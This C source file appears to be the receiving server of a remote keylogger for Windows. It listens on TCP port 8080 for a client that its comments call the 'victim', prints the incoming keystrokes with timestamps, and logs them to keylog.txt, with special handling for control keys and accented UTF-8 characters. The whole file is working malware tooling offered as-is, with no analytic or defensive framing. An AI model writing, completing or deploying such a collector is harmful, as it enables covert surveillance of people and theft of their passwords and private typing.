#include <stdio.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#define WSA_VERSION_CODE 0x202
#define CON_PORT 8080
#define KEYLOG_FILE "keylog.txt"
SOCKET serverSocket, clientSocket;

DWORD WINAPI clientHandler(LPVOID);

//BUILD A LOCAL TIMESTAMP: "YYYY-MM-DD HH:MM:SS" (+ ".mmm" WHEN REQUESTED)
static void formatTimestamp(char *buffer, size_t size, BOOL withMilliseconds){
    SYSTEMTIME st;
    GetLocalTime(&st);

    if(withMilliseconds){
        snprintf(buffer, size, "%04d-%02d-%02d %02d:%02d:%02d.%03d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
    }else{
        snprintf(buffer, size, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    }
}

static void printTimestampPrefix(void){
    char timestamp[40];

    formatTimestamp(timestamp, sizeof(timestamp), FALSE);
    printf("[%s] ", timestamp);
}

//APPEND ONE TIMESTAMPED ENTRY TO THE KEYLOG FILE
static void logEntry(const char *entry){
    FILE *logFile = fopen(KEYLOG_FILE, "a");
    char timestamp[40];

    if(logFile == NULL){
        return;
    }
    formatTimestamp(timestamp, sizeof(timestamp), TRUE);
    fprintf(logFile, "[%s] %s\n", timestamp, entry);
    fclose(logFile);
}

//LOG A KEYSTROKE: PRINTABLE TEXT AS-IS, CONTROL KEYS AS A LABEL
static void logKeystroke(const char *text, int length){
    char entry[64];

    if(length == 1 && text[0] == '\n'){
        logEntry("[ENTER]");
    }else if(length == 1 && text[0] == '\t'){
        logEntry("[TAB]");
    }else if(length == 1 && text[0] == '\b'){
        logEntry("[BACKSPACE]");
    }else{
        if(length >= (int)sizeof(entry)){
            length = (int)sizeof(entry) - 1;
        }
        memcpy(entry, text, (size_t)length);
        entry[length] = '\0';
        logEntry(entry);
    }
}

//PRINT AN EVENT WITH TIMESTAMP ON SCREEN AND IN THE KEYLOG FILE
static void reportEvent(const char *message){
    char timestamp[40];

    formatTimestamp(timestamp, sizeof(timestamp), FALSE);
    printf("[%s] %s\n", timestamp, message);
    fflush(stdout);
    logEntry(message);
}


int main(void){
    
    WSADATA wsadata;
    HANDLE threadHandle;
    DWORD tID, tExitCode;
    int bindResult;
    SOCKADDR_IN serverAddr;

    //PRINT THE RECEIVED UTF-8 TEXT AS IT WAS TYPED (ACCENTS, ñ, ¿, ¡...)
    SetConsoleOutputCP(CP_UTF8);

    //INITIALIZE WIN SOCKET API
    if(WSAStartup(WSA_VERSION_CODE, &wsadata) == 0){
        printf("WSA initialized successfully \n");
    }else{
        printf("WSA initialization failed. Err code:%d", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    //CREATE SERVER SOCKET TO BIND
    serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(serverSocket == INVALID_SOCKET){
        printf("Socket initialization failed. Err code:%d", WSAGetLastError());
        WSACleanup();
        return -1;
    }
    printf("Socket initialized successfully \n");

    //INITIALIZE SOCKET SERVER ADDRESS TO BIND
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(CON_PORT);

    //BIND SOCKET TO ADDRESS
    bindResult = bind(serverSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr));
    if(bindResult == SOCKET_ERROR){
        printf("Socket binding failed. Err code:%d", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return -1;
    }else{
        printf("Socket bound to address successfully \n");
    }

    //LISTEN FOR THE CLIENT (VICTIM)
    if(listen(serverSocket, SOMAXCONN) != SOCKET_ERROR){
        printf("Listening for the clients...\n");

        //ACCEPT THE CLIENT, GET ITS ADDRESS AND CREATE A THREAD FOR IT
        clientSocket = accept(serverSocket, NULL, NULL);
        if(clientSocket != INVALID_SOCKET){
            reportEvent("Client connected.");
            threadHandle = CreateThread(NULL, 0, &clientHandler, NULL, 0, &tID);

            //WAIT UNTIL THE THREAD TERMINATES
            WaitForSingleObject(threadHandle, INFINITE);
            GetExitCodeThread(threadHandle, &tExitCode);
            TerminateThread(threadHandle, tExitCode);
        }
    }else{
        printf("An error occurred during listening to clients. Err code:%d", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
    }

    //AFTER THE OPERATION TERMINATES, SHUTDOWN AND THEN CLOSE THE SOCKETS
    shutdown(clientSocket, SD_BOTH);
    shutdown(serverSocket, SD_BOTH);
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}

DWORD WINAPI clientHandler(LPVOID params){
    (void)params;
    int bytes_transferred;
    CHAR char_to_recv;
    char utf8Buffer[4];
    int utf8Length = 0;
    int utf8Expected = 0;
    int atLineStart = 1;
    char message[96];

    printTimestampPrefix();
    printf("Waiting for data...\n");
    fflush(stdout);

    while(1){
        bytes_transferred = recv(clientSocket, &char_to_recv, 1, 0);
        
        if(bytes_transferred > 0){
            unsigned char byte = (unsigned char)char_to_recv;

            //PLAIN ASCII (LETTERS, NUMBERS, \n, \t) IS PRINTED RIGHT AWAY
            if(utf8Length == 0 && byte < 0x80){
                if(byte == '\b'){
                    if(!atLineStart){
                        printf("\b \b");    //ERASE THE PREVIOUS CHARACTER
                    }
                }else{
                    if(atLineStart){
                        printTimestampPrefix();
                        atLineStart = 0;
                    }
                    printf("%c", byte);
                    if(byte == '\n'){
                        atLineStart = 1;
                    }
                }
                logKeystroke(&char_to_recv, 1);
                fflush(stdout);
                continue;
            }

            //ACCENTS AND ñ ARRIVE AS SEVERAL UTF-8 BYTES: WAIT FOR THE WHOLE CHARACTER
            if(utf8Length == 0){
                if((byte & 0xE0) == 0xC0)      utf8Expected = 2;
                else if((byte & 0xF0) == 0xE0) utf8Expected = 3;
                else if((byte & 0xF8) == 0xF0) utf8Expected = 4;
                else continue;                  //INVALID BYTE, IGNORE IT
            }

            utf8Buffer[utf8Length++] = (char)byte;
            if(utf8Length == utf8Expected){
                if(atLineStart){
                    printTimestampPrefix();
                    atLineStart = 0;
                }
                fwrite(utf8Buffer, 1, (size_t)utf8Length, stdout);
                fflush(stdout);
                logKeystroke(utf8Buffer, utf8Length);
                utf8Length = 0;
                utf8Expected = 0;
            }
        } else if (bytes_transferred == 0) {
            if(!atLineStart){
                printf("\n");
                atLineStart = 1;
            }
            reportEvent("Client disconnected.");
            break;
        } else {
            if(!atLineStart){
                printf("\n");
                atLineStart = 1;
            }
            snprintf(message, sizeof(message), "Connection lost. Error code: %d", WSAGetLastError());
            reportEvent(message);
            break;
        }
    }
    return 0;
}